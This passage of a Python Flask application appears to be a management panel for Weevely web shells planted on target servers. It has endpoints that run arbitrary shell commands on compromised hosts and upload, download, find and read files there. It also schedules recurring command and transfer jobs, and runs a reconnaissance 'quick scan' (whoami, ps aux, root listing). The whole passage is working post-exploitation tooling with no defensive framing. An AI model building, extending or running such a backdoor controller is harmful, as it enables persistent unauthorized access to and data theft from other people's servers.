    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/session/info', methods=['GET'])
def get_session_info(weevely_id):
    """Lấy thông tin session"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.get_session_info(shell_conn.url, password)
        
        return jsonify({
            'status': 'success' if result else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# MODULE EXECUTION
# ==========================================

@blueprint.route('/<weevely_id>/execute', methods=['POST'])
def execute_module(weevely_id):
    """Thực thi module command"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        command = data.get('command')
        timeout = data.get('timeout', 60)
        retries = data.get('retries', 1)
        
        if not command:
            return jsonify({'status': 'error', 'message': 'Command required'}), 400
        
        result = executor.execute_module(shell_conn.url, password, command, timeout, retries)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/batch', methods=['POST'])
def batch_execute(weevely_id):
    """Thực thi nhiều command"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        commands = data.get('commands', [])
        delay = data.get('delay', 0.5)
        
        if not commands:
            return jsonify({'status': 'error', 'message': 'Commands required'}), 400
        
        result = executor.batch_execute(shell_conn.url, password, commands, delay)
        
        return jsonify({
            'status': 'success',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# FILE OPERATIONS
# ==========================================

@blueprint.route('/<weevely_id>/file/find', methods=['POST'])
def file_find(weevely_id):
    """Tìm kiếm files"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        search_path = data.get('path', '/')
        pattern = data.get('pattern', '')
        file_type = data.get('file_type', 'f')
        vector = data.get('vector', 'sh_find')
        
        result = executor.file_find(shell_conn.url, password, search_path, pattern, file_type, vector)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/file/read', methods=['POST'])
def file_read(weevely_id):
    """Đọc file"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        file_path = data.get('file_path')
        vector = data.get('vector', 'file_get_contents')
        encoding = data.get('encoding', 'utf-8')
        
        if not file_path:
            return jsonify({'status': 'error', 'message': 'File path required'}), 400
        
        result = executor.file_read(shell_conn.url, password, file_path, vector, encoding)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# SYSTEM OPERATIONS
# ==========================================

@blueprint.route('/<weevely_id>/system/info', methods=['GET'])
def system_info(weevely_id):
    """Lấy system info"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.execute_module(shell_conn.url, password, ':system_info')
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/shell', methods=['POST'])
def shell_execute(weevely_id):
    """Thực thi shell command"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        command = data.get('command')
        if not command:
            return jsonify({'status': 'error', 'message': 'Command required'}), 400
        
        shell_cmd = f':shell_sh {command}'
        result = executor.execute_module(shell_conn.url, password, shell_cmd)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# UTILITY
# ==========================================

@blueprint.route('/modules', methods=['GET'])
def get_available_modules():
    """Lấy danh sách modules"""
    try:
        modules = executor.COMMON_MODULES
        vectors = executor.FILE_VECTORS
        
        return jsonify({
            'status': 'success',
            'data': {
                'modules': modules,
                'vectors': vectors
            }
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# ENHANCED API ENDPOINTS FOR GUI INTEGRATION
# ==========================================

@blueprint.route('/api/weevely/<weevely_id>/details', methods=['GET'])
def get_weevely_details(weevely_id):
    """Get weevely connection details for terminal"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'success': False, 'error': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        
        return jsonify({
            'success': True,
            'weevely': {
                'id': shell_conn.connection_id,
                'url': shell_conn.url,
                'password': password,
                'name': shell_conn.name,
                'status': shell_conn.status.name,
                'created_at': shell_conn.created_at.isoformat() if shell_conn.created_at else None
            }
        })
        
    except Exception as e:
        print(f"Error getting weevely details: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/execute-module', methods=['POST'])
def execute_weevely_module():
    """Execute weevely module command"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        url = data.get('url')
        password = data.get('password')
        module_command = data.get('module_command')
        timeout = data.get('timeout', 60)
        retries = data.get('retries', 1)
        
        if not all([url, password, module_command]):
            return jsonify({
                'success': False,
                'error': 'Missing required parameters: url, password, module_command'
            }), 400
        
        # Execute module
        result = executor.execute_module(url, password, module_command, timeout, retries)
        
        return jsonify(result)
        
    except Exception as e:
        print(f"Error executing module: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/test-connection', methods=['POST'])
def test_weevely_connection():
    """Test weevely connection"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        url = data.get('url')
        password = data.get('password')
        timeout = data.get('timeout', 10)
        
        if not all([url, password]):
            return jsonify({
                'success': False,
                'error': 'Missing required parameters: url, password'
            }), 400
        
        # Test connection
        result = executor.test_connection(url, password, timeout)
        
        return jsonify(result)
        
    except Exception as e:
        print(f"Error testing connection: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/<weevely_id>/test-connection', methods=['POST'])
def test_weevely_connection_by_id(weevely_id):
    """Test weevely connection by ID"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'success': False, 'error': 'Weevely not found'}), 404
        
        password = shell_conn.password
        if not password:
            return jsonify({'success': False, 'error': 'Password not found'}), 400
        
        # Test connection
        result = executor.test_connection(shell_conn.url, password, 10)
        
        # Update status in database if needed
        if result['success']:
            shell_conn.status = ShellStatus.CONNECTED
        else:
            shell_conn.status = ShellStatus.DISCONNECTED
        
        shell_conn.last_active = datetime.now()
        db.session.commit()
        
        return jsonify(result)
        
    except Exception as e:
        print(f"Error testing connection by ID: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/batch-execute', methods=['POST'])
def batch_execute_weevely():
    """Execute multiple weevely commands in batch"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        url = data.get('url')
        password = data.get('password')
        commands = data.get('commands', [])
        delay = data.get('delay', 0.5)
        
        if not all([url, password]) or not commands:
            return jsonify({
                'success': False,
                'error': 'Missing required parameters: url, password, commands'
            }), 400
        
        # Execute batch
        result = executor.batch_execute(url, password, commands, delay)
        
        return jsonify(result)
        
    except Exception as e:
        print(f"Error executing batch: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/session-info', methods=['POST'])
def get_weevely_session_info():
    """Get comprehensive session information"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        url = data.get('url')
        password = data.get('password')
        
        if not all([url, password]):
            return jsonify({
                'success': False,
                'error': 'Missing required parameters: url, password'
            }), 400
        
        # Get session info
        session_info = executor.get_session_info(url, password)
        
        return jsonify({
            'success': True,
            'session_info': session_info
        })
        
    except Exception as e:
        print(f"Error getting session info: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/upload-file', methods=['POST'])
def upload_file_to_target():
    """Upload file to target server via weevely"""
    try:
        if not executor:
            return jsonify({
                'success': False,
                'error': 'WeevelyModuleExecutor not initialized'
            }), 500
        
        # Get form data
        url = request.form.get('url')
        password = request.form.get('password')
        target_path = request.form.get('target_path')
        vector = request.form.get('vector', 'file_put_contents')
        
        if not all([url, password, target_path]):
            return jsonify({
                'success': False,
                'error': 'Missing required parameters'
            }), 400
        
        # Get uploaded file
        if 'file' not in request.files:
            return jsonify({
                'success': False,
                'error': 'No file uploaded'
            }), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({
                'success': False,
                'error': 'No file selected'
            }), 400
        
        # Save file temporarily
        filename = secure_filename(file.filename)
        temp_path = os.path.join(tempfile.gettempdir(), filename)
        file.save(temp_path)
        
        try:
            # Upload via weevely
            upload_command = f":file_upload -vector {vector} {temp_path} {target_path}"
            result = executor.execute_module(url, password, upload_command, 120)
            
            # Clean up temp file
            os.remove(temp_path)
            
            if result['success']:
                return jsonify({
                    'success': True,
                    'target_path': target_path,
                    'file_size': os.path.getsize(temp_path) if os.path.exists(temp_path) else 0,
                    'message': 'File uploaded successfully'
                })
            else:
                return jsonify({
                    'success': False,
                    'error': result.get('error', 'Upload failed')
                })
                
        except Exception as e:
            # Clean up temp file on error
            if os.path.exists(temp_path):
                os.remove(temp_path)
            raise e
        
    except Exception as e:
        print(f"Error uploading file: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==========================================
# CRON JOB MANAGEMENT WITH DATABASE
# ==========================================

@blueprint.route('/api/weevely/cron-jobs', methods=['POST'])
def create_cron_job():
    """Create a new cron job"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        # Validate required fields
        required_fields = ['name', 'cron_expression', 'job_type', 'job_data']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    'success': False, 
                    'error': f'Missing required field: {field}'
                }), 400
        
        # Create cron job
        cron_job = CronJob(
            name=data['name'],
            description=data.get('description', ''),
            cron_expression=data['cron_expression'],
            timezone=data.get('timezone', 'UTC'),
            job_type=data['job_type'],
            job_data=data['job_data'],
            weevely_connection_id=data.get('weevely_connection_id')
        )
        
        cron_job.save()
        
        return jsonify({
            'success': True,
            'cron_job': cron_job.to_dict(),
            'message': 'Cron job created successfully'
        })
        
    except Exception as e:
        print(f"Error creating cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs', methods=['GET'])
def get_cron_jobs():
    """Get all cron jobs with optional filtering"""
    try:
        weevely_id = request.args.get('weevely_id')
        active_only = request.args.get('active_only', 'false').lower() == 'true'
        
        query = CronJob.query
        
        if weevely_id:
            query = query.filter_by(weevely_connection_id=weevely_id)
        
        if active_only:
            query = query.filter_by(is_active=True)
        
        cron_jobs = query.order_by(CronJob.created_at.desc()).all()
        
        return jsonify({
            'success': True,
            'cron_jobs': [job.to_dict() for job in cron_jobs],
            'total_count': len(cron_jobs)
        })
        
    except Exception as e:
        print(f"Error getting cron jobs: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs/<int:job_id>', methods=['GET'])
def get_cron_job(job_id):
    """Get a specific cron job by ID"""
    try:
        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return jsonify({'success': False, 'error': 'Cron job not found'}), 404
        
        return jsonify({
            'success': True,
            'cron_job': cron_job.to_dict()
        })
        
    except Exception as e:
        print(f"Error getting cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs/<int:job_id>', methods=['PUT'])
def update_cron_job(job_id):
    """Update a cron job"""
    try:
        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return jsonify({'success': False, 'error': 'Cron job not found'}), 404
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        # Update allowed fields
        allowed_fields = [
            'name', 'description', 'cron_expression', 'timezone', 
            'job_type', 'job_data', 'weevely_connection_id', 'is_active'
        ]
        
        for field in allowed_fields:
            if field in data:
                setattr(cron_job, field, data[field])
        
        cron_job.save()
        
        return jsonify({
            'success': True,
            'cron_job': cron_job.to_dict(),
            'message': 'Cron job updated successfully'
        })
        
    except Exception as e:
        print(f"Error updating cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs/<int:job_id>', methods=['DELETE'])
def delete_cron_job(job_id):
    """Delete a cron job"""
    try:
        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return jsonify({'success': False, 'error': 'Cron job not found'}), 404
        
        cron_job.delete()
        
        return jsonify({
            'success': True,
            'message': 'Cron job deleted successfully'
        })
        
    except Exception as e:
        print(f"Error deleting cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs/<int:job_id>/toggle', methods=['POST'])
def toggle_cron_job(job_id):
    """Toggle cron job active status"""
    try:
        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return jsonify({'success': False, 'error': 'Cron job not found'}), 404
        
        cron_job.is_active = not cron_job.is_active
        cron_job.save()
        
        status = 'activated' if cron_job.is_active else 'deactivated'
        
        return jsonify({
            'success': True,
            'cron_job': cron_job.to_dict(),
            'message': f'Cron job {status} successfully'
        })
        
    except Exception as e:
        print(f"Error toggling cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-jobs/<int:job_id>/execute', methods=['POST'])
def execute_cron_job_now(job_id):
    """Execute a cron job immediately"""
    try:
        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return jsonify({'success': False, 'error': 'Cron job not found'}), 404
        
        # Parse job data
        import json
        try:
            job_params = json.loads(cron_job.job_data)
        except json.JSONDecodeError:
            return jsonify({'success': False, 'error': 'Invalid job data format'}), 400
        
        # Execute based on job type
        if cron_job.job_type == 'file_operation':
            result = execute_file_operation_job(cron_job, job_params)
        elif cron_job.job_type == 'command':
            result = execute_command_job(cron_job, job_params)
        elif cron_job.job_type == 'download':
            result = execute_download_job(cron_job, job_params)
        elif cron_job.job_type == 'upload':
            result = execute_upload_job(cron_job, job_params)
        else:
            return jsonify({'success': False, 'error': f'Unknown job type: {cron_job.job_type}'}), 400
        
        # Update job statistics
        cron_job.run_count += 1
        cron_job.last_run = dt.datetime.utcnow()
        if result.get('success'):
            cron_job.success_count += 1
        else:
            cron_job.failure_count += 1
        cron_job.save()
        
        return jsonify({
            'success': True,
            'result': result,
            'message': 'Cron job executed successfully'
        })
        
    except Exception as e:
        print(f"Error executing cron job: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

def execute_file_operation_job(cron_job, job_params):
    """Execute file operation job"""
    try:
        if not executor:
            return {'success': False, 'error': 'WeevelyModuleExecutor not initialized'}
        
        weevely_conn = ShellConnection.get_by_id(cron_job.weevely_connection_id)
        if not weevely_conn:
            return {'success': False, 'error': 'Weevely connection not found'}
        
        password = weevely_conn.password
        if not password:
            return {'success': False, 'error': 'Password not found'}
        
        operation = job_params.get('operation')
        source = job_params.get('source')
        destination = job_params.get('destination')
        
        if operation == 'copy':
            command = f":file_cp {source} {destination}"
        elif operation == 'move':
            command = f":file_mv {source} {destination}"
        elif operation == 'delete':
            command = f":file_rm {source}"
        elif operation == 'mkdir':
            command = f":file_mkdir {source}"
        else:
            return {'success': False, 'error': f'Unknown operation: {operation}'}
        
        result = executor.execute_module(weevely_conn.url, password, command)
        return result
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_command_job(cron_job, job_params):
    """Execute command job"""
    try:
        if not executor:
            return {'success': False, 'error': 'WeevelyModuleExecutor not initialized'}
        
        weevely_conn = ShellConnection.get_by_id(cron_job.weevely_connection_id)
        if not weevely_conn:
            return {'success': False, 'error': 'Weevely connection not found'}
        
        password = weevely_conn.password
        if not password:
            return {'success': False, 'error': 'Password not found'}
        
        command = job_params.get('command')
        if not command:
            return {'success': False, 'error': 'No command specified'}
        
        result = executor.execute_module(weevely_conn.url, password, command)
        return result
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_download_job(cron_job, job_params):
    """Execute download job"""
    try:
        if not executor:
            return {'success': False, 'error': 'WeevelyModuleExecutor not initialized'}
        
        weevely_conn = ShellConnection.get_by_id(cron_job.weevely_connection_id)
        if not weevely_conn:
            return {'success': False, 'error': 'Weevely connection not found'}
        
        password = weevely_conn.password
        if not password:
            return {'success': False, 'error': 'Password not found'}
        
        target_path = job_params.get('target_path')
        if not target_path:
            return {'success': False, 'error': 'No target path specified'}
        
        command = f":file_download {target_path}"
        result = executor.execute_module(weevely_conn.url, password, command)
        return result
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_upload_job(cron_job, job_params):
    """Execute upload job"""
    try:
        if not executor:
            return {'success': False, 'error': 'WeevelyModuleExecutor not initialized'}
        
        weevely_conn = ShellConnection.get_by_id(cron_job.weevely_connection_id)
        if not weevely_conn:
            return {'success': False, 'error': 'Weevely connection not found'}
        
        password = weevely_conn.password
        if not password:
            return {'success': False, 'error': 'Password not found'}
        
        source_path = job_params.get('source_path')
        target_path = job_params.get('target_path')
        if not source_path or not target_path:
            return {'success': False, 'error': 'Source and target paths required'}
        
        command = f":file_upload {source_path} {target_path}"
        result = executor.execute_module(weevely_conn.url, password, command)
        return result
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ==========================================
# CRON DOWNLOAD MANAGEMENT
# ==========================================

@blueprint.route('/api/weevely/cron-download', methods=['POST'])
def create_cron_download():
    """Create a scheduled download job"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        # Validate required fields
        required_fields = ['id', 'url', 'target_path', 'cron_expression', 'weevely_connection']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    'success': False,
                    'error': f'Missing required field: {field}'
                }), 400
        
        # Store cron job (in production, save to database)
        cron_id = data['id']
        cron_downloads[cron_id] = {
            'id': cron_id,
            'url': data['url'],
            'target_path': data['target_path'],
            'cron_expression': data['cron_expression'],
            'schedule_type': data.get('schedule_type', 'custom'),
            'auto_cleanup': data.get('auto_cleanup', True),
            'weevely_connection': data['weevely_connection'],
            'created_at': data.get('created_at', datetime.now().isoformat()),
            'status': data.get('status', 'active'),
            'last_run': None,
            'next_run': None,
            'run_count': 0
        }
        
        return jsonify({
            'success': True,
            'cron_id': cron_id,
            'message': 'Cron download scheduled successfully'
        })
        
    except Exception as e:
        print(f"Error creating cron download: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-downloads', methods=['GET'])
def get_cron_downloads():
    """Get all cron downloads for a weevely connection"""
    try:
        weevely_id = request.args.get('weevely_id')
        
        # Filter by weevely_id if provided
        filtered_crons = []
        for cron in cron_downloads.values():
            if not weevely_id or cron['weevely_connection'].get('id') == weevely_id:
                filtered_crons.append(cron)
        
        return jsonify({
            'success': True,
            'cron_downloads': filtered_crons
        })
        
    except Exception as e:
        print(f"Error getting cron downloads: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-download/<cron_id>', methods=['PATCH'])
def update_cron_download(cron_id):
    """Update cron download status"""
    try:
        if cron_id not in cron_downloads:
            return jsonify({'success': False, 'error': 'Cron download not found'}), 404
        
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        # Update allowed fields
        allowed_fields = ['status', 'auto_cleanup']
        for field in allowed_fields:
            if field in data:
                cron_downloads[cron_id][field] = data[field]
        
        return jsonify({
            'success': True,
            'message': 'Cron download updated successfully'
        })
        
    except Exception as e:
        print(f"Error updating cron download: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/api/weevely/cron-download/<cron_id>', methods=['DELETE'])
def delete_cron_download(cron_id):
    """Delete cron download"""
    try:
        if cron_id not in cron_downloads:
            return jsonify({'success': False, 'error': 'Cron download not found'}), 404
        
        del cron_downloads[cron_id]
        
        return jsonify({
            'success': True,
            'message': 'Cron download deleted successfully'
        })
        
    except Exception as e:
        print(f"Error deleting cron download: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@blueprint.route('/<weevely_id>/quick-scan', methods=['POST'])
def quick_scan(weevely_id):
    """Quick scan with common commands"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        # Quick scan commands
        commands = [
            ':system_info',
            ':shell_sh whoami',
            ':shell_sh pwd',
            ':file_ls /',
            ':shell_sh ps aux | head -10'
        ]
        
        result = executor.batch_execute(shell_conn.url, password, commands, delay=0.3)
        
        return jsonify({
            'status': 'success',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500